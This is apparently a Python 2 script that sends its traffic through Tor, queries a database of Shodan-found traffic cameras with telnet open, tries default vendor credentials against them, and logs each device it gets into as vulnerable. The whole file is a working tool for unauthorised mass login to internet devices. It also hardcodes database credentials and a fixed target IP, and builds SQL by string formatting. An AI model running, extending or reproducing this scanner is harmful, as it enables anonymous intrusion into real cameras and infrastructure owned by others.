#!/user/bin/python

import socket
import socks
import telnetlib
import MySQLdb
import urllib
import json

db = MySQLdb.connect("128.196.27.147","ShodanTeam","Sh0d@n7e", "shodan")

def connectTor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    socket.socket = socks.socksocket

    data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
    print 'Testing data using IP: ' + data["ip"]

    cursor = db.cursor()

    try:
        sql = "SELECT * FROM allshodan  \
               WHERE (nicknm = 'traffic cam') AND portnum = 23"

            # % (keyword, keyword, keyword, keyword, keyword)
        try:
            # Execute the SQL command
            cursor.execute(sql)
            # Commit your changes in the database
            results = cursor.fetchall()
            if results == ():
                print('null')
                passID = 0
            else:
                for row in results:
                    nicknm = row[2]
                    ip = row[3]
                # Now print fetched result
                    print "IP =%s, nick=%s" % \
                       (ip, nicknm)
                    #requests.session(headers=headers, hooks=hooks, verify=False)
                    ipaddr = ip
                    #print('connected to device, no login')

                    sql = "SELECT * FROM passworddb \
                           WHERE vendor = 'traffic cam'"

                    try:
                        # Execute the SQL command
                        cursor.execute(sql)
                        # Commit your changes in the database
                        results = cursor.fetchall()
                        for row in results:
                            passID = row[0]
                            UserName = row[9]
                            Password = row[10]
                        # Now print fetched result

                            HOST = ip
                            user = UserName
                            password = Password

                            #tn = telnetlib.Telnet(HOST,'',2)
                            tn = telnetlib.Telnet('64.59.176.38','',2)
                            #print "tel success"

                            try:
                                line = tn.read_until("A$tring+hatWouldN0tExist", 3)

                                strline = str(line)
                                strline = strline.replace('\'','')
                                line = strline

                                if ("login" in line) or ("user" in line) or ("password" in line):
                                    try:
                                        #print passID
                                        #Username is also sometimes a option sometimes there is only a password
                                        tn.read_until("login: ")
                                        try:
                                            tn.write(user + "\n")
                                            #print "user success"
                                        except:
                                            print "fail user write"
                                            tn.close()
                                        if password:
                                            tn.read_until("Password: ")
                                            try:
                                                tn.write(password + "\n")
                                                #print "pass success"
                                            except:
                                                print "pass failure"
                                                tn.close()
                                        try:
                                            line = tn.read_until("A$tring+hatWouldN0tExist",3)

                                            strline = str(line)
                                            strline = strline.replace('\'','')
                                            line = strline

                                            if not (("user" in line)or("username" in line)or("login" in line)):
                                                try:
                                                    #print passID
                                                    sql = "INSERT INTO VulnerableSystems(ipaddr, passwordid, notes, openport) \
                                                               VALUES ('%s', '%s', '%s', '%s')" % (ipaddr, passID, line, '')
                                                    tn.close()
                                                except:
                                                    print 'error on SQL insert'
                                                    tn.close()
                                                try:
                                                    # Execute the SQL command
                                                    cursor.execute(sql)
                                                    # Commit your changes in the database
                                                    db.commit()
                                                    print "successfully inserted a default pass"
                                                except Exception, e:
                                                        print 'Error: %s' % e
                                                        # Rollback in case there is any error
                                                        db.rollback()
                                                        print "Error inserting Data: rolledback"
                                                #print "ilon success!"
                                                #print line
                                                tn.close()
                                            else:
                                                print "A strange error occurred"
                                                tn.close()

                                        except:
                                            print"error on connecting"
                                            tn.close()

                                    except:
                                        print 'error on info retrieve'
                                        tn.close()

                                    tn.close()
                                else:
                                    print "No known login needed"
                                    try:
                                        #print passID
                                        sql = "INSERT INTO VulnerableSystems(ipaddr, passwordid, notes, openport) \
                                                   VALUES ('%s', '%s', '%s', '%s')" % (ipaddr, '5002', line, 'no login needed')
                                        tn.close()
                                    except:
                                        print 'error on SQL insert'
                                        tn.close()
                                    try:
                                        # Execute the SQL command
                                        cursor.execute(sql)
                                        # Commit your changes in the database
                                        db.commit()
                                        print "successfully inserted a default pass"
                                    except Exception, e:
                                            print 'Error: %s' % e
                                            # Rollback in case there is any error
                                            db.rollback()
                                            print "Error inserting Data: rolledback"
                                    tn.close()

                                print tn.read_all()
                            except:
                                print "Telnet Server Not Available"
                                tn.close()


                    except:
                        print('server timeout')

        except Exception, e:
                print 'Error: %s' % e

    except Exception as e:
        print ('Error: %s' % e)
        db.close()

connectTor()
